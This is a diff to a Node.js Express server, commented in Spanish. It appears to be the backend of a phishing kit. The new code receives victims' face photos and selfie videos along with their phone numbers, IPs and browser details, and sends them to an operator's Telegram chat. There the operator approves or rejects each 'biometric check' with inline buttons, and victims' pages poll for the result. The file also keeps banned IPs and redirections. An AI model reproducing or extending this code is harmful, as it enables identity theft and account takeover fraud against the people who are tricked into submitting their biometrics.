@@ -5,6 +5,9 @@ const bodyParser = require('body-parser');
 const axios = require('axios');
 const cors = require('cors');
 const FormData = require('form-data');
+const multer = require('multer');
+const upload = multer({ storage: multer.memoryStorage() });
+
 const app = express();
 
 // ==================== CONFIGURACIÓN CORS ====================
@@ -34,6 +37,7 @@ if (!BOT_TOKEN || !CHAT_ID) {
 const redirections = new Map();
 const bannedIPs = new Set();
 const sessionData = new Map();
+const biometricStatus = new Map(); // sessionId -> pending | approved | rejected
 
 // ==================== FUNCIONES AUXILIARES ====================
 const getTelegramApiUrl = (method) =>
@@ -89,21 +93,16 @@ app.get('/', (_req, res) => {
   res.json({ ok: true, status: 'running' });
 });
 
-// ==================== ENDPOINT: BIOMETRÍA (CORREGIDO) ====================
+// ==================== BIOMETRÍA POR FOTO ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
 
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false });
-    }
-
     if (!sessionId || !imageBase64) {
-      return res.status(400).json({ ok: false, reason: 'Datos incompletos' });
+      return res.status(400).json({ ok: false });
     }
 
     const session = sessionData.get(sessionId) || {};
-
     const buffer = Buffer.from(
       imageBase64.replace(/^data:image\/\w+;base64,/, ''),
       'base64'
@@ -111,36 +110,113 @@ app.post('/step-biometrics', async (req, res) => {
 
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer, {
-      filename: 'biometria.jpg',
-      contentType: 'image/jpeg'
-    });
+    formData.append('photo', buffer, { filename: 'biometria.jpg' });
 
     formData.append(
       'caption',
-`🧬 BIOMETRÍA RECIBIDA
+`🧬 BIOMETRÍA FOTO
 
-📱 Número: ${phoneNumber || session.phoneNumber || 'N/A'}
-🆔 Session: ${sessionId}
-🌐 IP: ${ip || session.ip || 'N/A'}
-🖥️ UA: ${userAgent || 'N/A'}`
+📱 ${phoneNumber || session.phoneNumber || 'N/A'}
+🆔 ${sessionId}
+🌐 ${ip || session.ip || 'N/A'}
+🖥️ ${userAgent || 'N/A'}`
     );
 
-    await axios.post(
-      getTelegramApiUrl('sendPhoto'),
-      formData,
-      { headers: formData.getHeaders() }
-    );
+    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
+      headers: formData.getHeaders()
+    });
 
-    console.log(`🧬 Biometría enviada - Session: ${sessionId}`);
     res.json({ ok: true });
   } catch (err) {
-    console.error('❌ Error biometría:', err.message);
+    console.error(err.message);
     res.status(500).json({ ok: false });
   }
 });
 
-// ==================== (TODO LO DEMÁS SIGUE IGUAL EN TU ARCHIVO) ====================
-// webhook, redirecciones, consignar, auto-ping, setupTelegramWebhook, listen, etc.
-// ❗ NO SE TOCÓ NADA MÁS
+// ==================== BIOMETRÍA POR VIDEO ====================
+app.post('/api/verify-video', upload.single('video'), async (req, res) => {
+  try {
+    if (!req.file) return res.json({ success: false });
 
+    const sessionId = generateSessionId();
+    biometricStatus.set(sessionId, 'pending');
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', req.file.buffer, {
+      filename: 'biometria.webm'
+    });
+
+    formData.append(
+      'caption',
+`🎥 BIOMETRÍA VIDEO
+
+🆔 Session: ${sessionId}`
+    );
+
+    await axios.post(getTelegramApiUrl('sendVideo'), formData, {
+      headers: formData.getHeaders(),
+      params: {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ APROBAR', callback_data: `approve_bio|${sessionId}` },
+              { text: '❌ RECHAZAR', callback_data: `reject_bio|${sessionId}` }
+            ]
+          ]
+        }
+      }
+    });
+
+    res.json({ success: true, sessionId });
+  } catch (err) {
+    console.error(err.message);
+    res.json({ success: false });
+  }
+});
+
+// ==================== CHECK BIOMETRÍA ====================
+app.get('/api/check/:sessionId', (req, res) => {
+  const status = biometricStatus.get(req.params.sessionId) || 'pending';
+  res.json({ status });
+});
+
+// ==================== WEBHOOK TELEGRAM ====================
+app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
+  try {
+    const { callback_query } = req.body;
+    if (!callback_query) return res.sendStatus(200);
+
+    const [action, sessionId] = callback_query.data.split('|');
+
+    if (action === 'approve_bio') {
+      biometricStatus.set(sessionId, 'approved');
+    }
+
+    if (action === 'reject_bio') {
+      biometricStatus.set(sessionId, 'rejected');
+    }
+
+    if (action === 'ban') {
+      const s = sessionData.get(sessionId);
+      if (s?.ip) bannedIPs.add(s.ip);
+    }
+
+    await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
+      callback_query_id: callback_query.id,
+      text: 'Acción registrada',
+      show_alert: true
+    });
+
+    res.sendStatus(200);
+  } catch (err) {
+    console.error(err.message);
+    res.sendStatus(200);
+  }
+});
+
+// ==================== INICIAR SERVIDOR ====================
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, async () => {
+  console.log(`✅ Servidor activo en ${PORT}`);
+});
